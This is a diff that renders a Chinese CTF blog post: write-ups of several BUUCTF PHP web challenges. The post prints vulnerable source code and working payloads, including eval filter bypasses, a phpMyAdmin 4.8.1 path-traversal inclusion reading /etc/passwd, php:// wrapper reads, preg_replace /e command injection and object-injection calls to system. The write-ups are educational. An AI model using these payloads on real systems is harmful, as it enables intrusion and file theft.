@@ -1,32 +1,419 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>快乐寒假4 | 吴豪滨的地宫</title><meta name="keywords" content="CTF"><meta name="author" content="吴豪滨"><meta name="copyright" content="吴豪滨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="你👱🏻‍滴寒假本来似上分滴time不过你👱🏻‍后面确实success了,继续滚回来do题 [GXYCTF2019]禁止套娃又是一道感觉似曾相识的题目 你👱🏻‍打开环境,映入眼幕的是问你👱🏻‍flag在哪,别的没了 查看源代码也没有任何东西,看起来无货可整。 在没有其他明显目录而且没有hint的情况下考虑存在git泄露 使用Githack看看 果然扫出来一个,下面是源码 &lt;?p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="快乐寒假4">
+<meta property="og:url" content="http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/index.html">
+<meta property="og:site_name" content="吴豪滨的地宫">
+<meta property="og:description" content="你👱🏻‍滴寒假本来似上分滴time不过你👱🏻‍后面确实success了,继续滚回来do题 [GXYCTF2019]禁止套娃又是一道感觉似曾相识的题目 你👱🏻‍打开环境,映入眼幕的是问你👱🏻‍flag在哪,别的没了 查看源代码也没有任何东西,看起来无货可整。 在没有其他明显目录而且没有hint的情况下考虑存在git泄露 使用Githack看看 果然扫出来一个,下面是源码 &lt;?p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg">
+<meta property="article:published_time" content="2022-02-10T05:37:52.000Z">
+<meta property="article:modified_time" content="2022-02-20T09:17:40.578Z">
+<meta property="article:author" content="吴豪滨">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '快乐寒假4',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-20 17:17:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="吴豪滨的地宫" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/11/02/QcqvSFhZDRg5b7o.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">吴豪滨的地宫</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">快乐寒假4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-10T05:37:52.000Z" title="发表于 2022-02-10 13:37:52">2022-02-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-20T09:17:40.578Z" title="更新于 2022-02-20 17:17:40">2022-02-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="快乐寒假4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>你👱🏻‍滴寒假本来似上分滴time</strong><br><strong>不过你👱🏻‍后面确实success了,继续滚回来do题</strong></p>
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>又是一道感觉似曾相识的题目</p>
+<p>你👱🏻‍打开环境,映入眼幕的是问你👱🏻‍flag在哪,别的没了</p>
+<p>查看源代码也没有任何东西,看起来无货可整。</p>
+<p>在没有其他明显目录而且没有hint的情况下考虑存在git泄露</p>
+<p>使用Githack看看</p>
+<p>果然扫出来一个,下面是源码</p>
+<pre><code>&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&#39;exp&#39;]))&#123;
+if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;
+    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;
+        if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;
+            // echo $_GET[&#39;exp&#39;];
+            @eval($_GET[&#39;exp&#39;]);
+        &#125;
+        else&#123;
+            die(&quot;还差一点哦！&quot;);
+        &#125;
+    &#125;
+    else&#123;
+        die(&quot;再好好想想！&quot;);
+    &#125;
+&#125;
+else&#123;
+    die(&quot;还想读flag，臭弟弟！&quot;);
+    &#125;
+&#125;
+// highlight_file(__FILE__);
+?&gt;
+</code></pre>
+<p>分析下源码,大概是以下这样</p>
+<ol>
+<li>需要以GET形式传入一个exp参数，如果满足条件，会执行这个参数的内容；</li>
+<li>过滤了几个常用的伪协议；</li>
+<li>(?R)?重复引用当前表达式（递归调用），所以只能无参数绕过；</li>
+<li>过滤了一些关键字，限制一些函数的使用</li>
+</ol>
+<p>首先查看下当前目录的文件</p>
+<pre><code>payload:?exp=print_r(scandir(current(localeconv())));
+</code></pre>
+<ol>
+<li>localconv():函数返回一包含本地数字及货币格式信息的数组，数组第一项是.</li>
+<li>current()/pos():函数返回数组中的当前元素，初始指向第一个元素。</li>
+<li>所以current(localeconv())==’.’  （永远是点）</li>
+<li>scandir(‘.’):列出当前目录中的文件和目录。</li>
+</ol>
+<p>![)PK6UYXP4`S$G8ZLJSDBT{9.png](<a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/08/qZLCNT5R6MAShUt.png">https://s2.loli.net/2022/02/08/qZLCNT5R6MAShUt.png</a>)</p>
+<p>然后要读flag.php的内容</p>
+<pre><code>payload:?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre>
+<p>得到flag</p>
+<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>你👱🏻‍打开环境 只有两行字,F12确实就那点字</p>
+<p>既然提到了数据库,那么可以推测有phpmyadmin存在</p>
+<p>你👱🏻‍用扫描一看确实,直接进入连密码都不用输,</p>
+<p><img src="https://s2.loli.net/2022/02/09/5HBmciRJOQL1SnA.png"></p>
+<p>phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p>
+<p>使用你👱🏻‍找的payload直接打</p>
+<pre><code>?target=db_datadict.php%253f/../../../../../../../../etc/passwd
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/09/AHdrKiYcDqZampW.png"></p>
+<p>将etc/passwd改成flag得到flag</p>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>打开题目,嗯,代码审计</p>
+<pre><code>&lt;?php
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+   error_reporting(0);
+   $text = $_GET[&quot;text&quot;];
+   $file = $_GET[&quot;file&quot;];
+   if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;
+echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+if(preg_match(&quot;/flag/&quot;,$file))&#123;
+    die(&quot;Not now!&quot;);
+&#125;
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+include($file);  //next.php
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+&#125;
+else&#123;
+highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>可以用php://input伪协议来绕过file_get_contents()</p>
+<p>因为有include(),所以可以用php://filter来读取文件</p>
+<p>于是构造payload为</p>
+<pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php
+</code></pre>
+<p>得到一段base64加密的字符串,解密后得到</p>
+<pre><code> &lt;?php
+     $id = $_GET[&#39;id&#39;];
+     $_SESSION[&#39;id&#39;] = $id;
+
+function complex($re, $str) &#123;
+   return preg_replace(
+      &#39;/(&#39; . $re . &#39;)/ei&#39;,
+      &#39;strtolower(&quot;\\1&quot;)&#39;,
+       $str
+    );
+ &#125;
+ foreach($_GET as $re =&gt; $str) &#123;
+    echo complex($re, $str). &quot;\n&quot;;
+ &#125;
+
+ function getFlag()&#123;
+    @eval($_GET[&#39;cmd&#39;]);
+ &#125; 
+</code></pre>
+<p>继续进行代码审计,这里你👱🏻‍说一下知识点</p>
+<pre><code>preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行
+</code></pre>
+<p>这里的第二个参数是strtolower(“\1”),也就是strtolower(“\1”),而而\1在正则表达式中有自己的意思，也就是指定第一个匹配项，简单来说就是取出正则表达式匹配后子匹配表达式的第一项</p>
+<p>这里你👱🏻‍还偷了一点正则表达式的知识点</p>
+<pre><code>正则表达式的\S：匹配所有非空白字符；
+ .号：匹配除\n外的任意字符；
+ *号：匹配前面的字符0次或者多次
+ +号：匹配前面的字符1次或者多次（如果要在url里输入+号，必须要对其进行编码，+号编码为:%2b）
+
+php里，如果 双引号中有变量，那么php解释器会将其替换为变量解释后的结果，但单引号中的变量不会被处理（不过双引号中的函数不会被执行）
+</code></pre>
+<p>继续审计,对于foreach()函数,这个函数就是将我们传进去的参数变为正则,并且参数值变为字符串,getFlag()是需要我们eval执行的。</p>
+<p>接下来构造payload</p>
+<pre><code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
+</code></pre>
+<p>这个简单来说就是php5.5.0起的一个漏洞，pl为 /?.<em>={${phpinfo()}}。get值是/?.</em>,参数是{${phpinfo()}}</p>
+<p>这里解释下用\S*而不是用.*的原因：</p>
+<p>因为在php中，对于传入非法的$_GET参数名，会将其转换为下划线，导致正则匹配失效</p>
+<p>这里的.<em>会被和谐成_</em></p>
+<p>所以你👱🏻‍只能使用\S*或者\S%2b来进行构造payload</p>
+<p>所以最后为</p>
+<pre><code>http://e86a8450-06ee-47e1-84d7-a672322f8cfc.node4.buuoj.cn:81/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);
+</code></pre>
+<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p><img src="https://s2.loli.net/2022/02/10/HpiAGLZVqF5uOzS.png"></p>
+<p>可以 这风格你👱🏻‍喜欢</p>
+<p>抓个包</p>
+<p><img src="https://s2.loli.net/2022/02/10/1nlriGMet6qCuUj.png"></p>
+<p>POST有两个参数,其中date是函数,后面是他的参数,换成读取源代码确实能读到源代码,这里还可以合理怀疑使用了call_user_func()函数</p>
+<p><img src="https://s2.loli.net/2022/02/10/4VlmGq1ykLEWcOT.png"></p>
+<pre><code>&lt;?php
+$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
+function gettime($func, $p) &#123;
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == &quot;string&quot;) &#123;
+        return $result;
+    &#125; else &#123;return &quot;&quot;;&#125;
+&#125;
+class Test &#123;
+    var $p = &quot;Y-m-d h:i:s a&quot;;
+    var $func = &quot;date&quot;;
+    function __destruct() &#123;
+        if ($this-&gt;func != &quot;&quot;) &#123;
+            echo gettime($this-&gt;func, $this-&gt;p);
+        &#125;
+    &#125;
+&#125;
+$func = $_REQUEST[&quot;func&quot;];
+$p = $_REQUEST[&quot;p&quot;];
+
+if ($func != null) &#123;
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) &#123;
+        echo gettime($func, $p);
+    &#125;else &#123;
+        die(&quot;Hacker...&quot;);
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>这里可以看到禁用了system等函数,所以可以用序列化加上url编码绕过</p>
+<p>因为过滤只对我们输入的post的func进行检查,在test类里并没有检查,所以更改Test类中的参数即可让我们的system函数传入</p>
+<p>先查看目录</p>
+<pre><code>&lt;?php
+   class Test &#123;
+    var $p = &quot;ls /&quot;;
+    var $func = &quot;system&quot;;
+    &#125;
+ $a = new Test();
+ echo serialize($a);
+ //unserialize
+?&gt;
+</code></pre>
+<p>再看flag在哪</p>
+<p><img src="https://s2.loli.net/2022/02/10/6HZMt1jTB3FAeNo.png"></p>
+<p>最后再看flag</p>
+<pre><code>  &lt;?php
+ class Test &#123;
+    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;
+    var $func = &quot;system&quot;;
+ &#125;
+$a = new Test();
+echo serialize($a);
+//unserialize
+?&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/02/10/y5abSW3Px7Beks1.png"></p>
+<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p><img src="https://s2.loli.net/2022/02/10/qajX2oRcSGLdPJT.png"></p>
+<p>都这样说了 你👱🏻‍不得去看看源🐴？</p>
+<p><img src="https://s2.loli.net/2022/02/10/Cta9edW6Ek8ZRDG.png"></p>
+<p>这🐴好多,你👱🏻‍作为银类肯定是整不动了,只能ask for 帮助了</p>
+<p>随便打开一个页面，发现里面存在着大量的system和eval函数，而且参数是我们可控的,所以你👱🏻‍可以通过$_GET[]来传递命令，然后由system()或eval()执行,但大概率是只有答案那个参数可以用,所以我们需要脚本来找出那个参数。</p>
+<p>后面你👱🏻‍自己写和找的脚本都不行</p>
+<p>这题你👱🏻‍卡太久 暂时跳过</p>
+<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>进来什么都没有,是个模板前端</p>
+<p>你👱🏻‍用哪dirsearch扫了一下 发现.git泄露</p>
+<p>用githack下载下来源码 分别有flag.php和index.php</p>
+<p>flag的内容只有：</p>
+<pre><code>$flag = file_get_contents(&#39;/flag&#39;);
+</code></pre>
+<p>index的内容有:</p>
+<pre><code>&lt;?php
+
+ include &#39;flag.php&#39;;
+ $yds = &quot;dog&quot;;
+ $is = &quot;cat&quot;;
+ $handsome = &#39;yds&#39;;
+
+ foreach($_POST as $x =&gt; $y)&#123;
+ $$x = $y;
+ &#125;
+ foreach($_GET as $x =&gt; $y)&#123;
+$$x = $$y;
+&#125;
+
+foreach($_GET as $x =&gt; $y)&#123;
+if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;
+    exit($handsome);
+&#125;
+&#125;
+
+if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;
+exit($yds);
+&#125;
+
+if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;
+exit($is);
+&#125;
+echo &quot;the flag is: &quot;.$flag;
+</code></pre>
+<p>前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag</p>
+<p>你👱🏻‍要做的就是让脚本执行到最后一句echo $flag;</p>
+<p>但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参flag=aaa，在第二个foreach语句中变成$flag = $aaa，而$aaa变量没有定义为空，最后的输出就是空</p>
+<p>我们POST传参flag=aaa，在第一个foreach语句中变成$flag= aaa，flag被覆盖为‘aaa’，最后输出aaa</p>
+<p>你👱🏻‍沾点无奈了，但是if语句中的exit()函数虽然会退出执行，但也会输出其参数，你👱🏻‍可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了</p>
+<p>这里面有三个if语句，其中有两个能利用变量覆盖输出flag,也就是说有两种方法</p>
+<p>一是第二个if语句中可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果，GET传参yds=flag，在第二个foreach语句中，首先是$x=yds，$y=flag，经过$$x = $$y也就变成了$yds=$flag</p>
+<p>二是第三个if语句中输出变量$is，判断条件为$_POST[‘flag’] === ‘flag’ || $_GET[‘flag’] === ‘flag’，这里可以通过满足后面这个条件进行变量覆盖：GET传参is=flag&amp;flag=flag；在第二个foreach语句中，首先是$x=is,$y=flag,带进去就变成了$is=$flag，这就达到了覆盖的目的，而参数中flag=flag只是为了满足if语句</p>
+<p>传入进去 F12就拿到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">吴豪滨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/">http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">吴豪滨的地宫</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/02/08/ia9UBKSlbjgFZEs.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/20/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%875/"><img class="prev-cover" src="https://s2.loli.net/2022/02/21/OAu6CDveWbtYpPh.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">快乐寒假5</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/"><img class="next-cover" src="https://s2.loli.net/2022/02/08/LUMTIignN3mu2jb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">快乐寒假3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/23/DASCTF%202022/" title="DASCTF 2022"><img class="cover" src="https://s2.loli.net/2022/03/23/ouOyf5ecU1hawIS.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-23</div><div class="title">DASCTF 2022</div></div></a></div><div><a href="/2021/11/02/badmac/" title="badmac"><img class="cover" src="https://i.loli.net/2021/11/09/gRnKyC1ztL7PIDH.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">badmac</div></div></a></div><div><a href="/2021/11/06/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%981/" title="你爹刷题1"><img class="cover" src="https://i.loli.net/2021/11/09/SaopgqOWJmMT6cE.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-06</div><div class="title">你爹刷题1</div></div></a></div><div><a href="/2022/02/28/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%982/" title="你爹刷题2"><img class="cover" src="https://s2.loli.net/2022/02/28/DchyG29YqFBAfJR.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-28</div><div class="title">你爹刷题2</div></div></a></div><div><a href="/2022/03/01/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%983/" title="你爹刷题3"><img class="cover" src="https://img1.baidu.com/it/u=3722771254,1462812708&fm=253&fmt=auto&app=138&f=JPEG?w=370&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="title">你爹刷题3</div></div></a></div><div><a href="/2022/03/04/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%984/" title="你爹刷题4"><img class="cover" 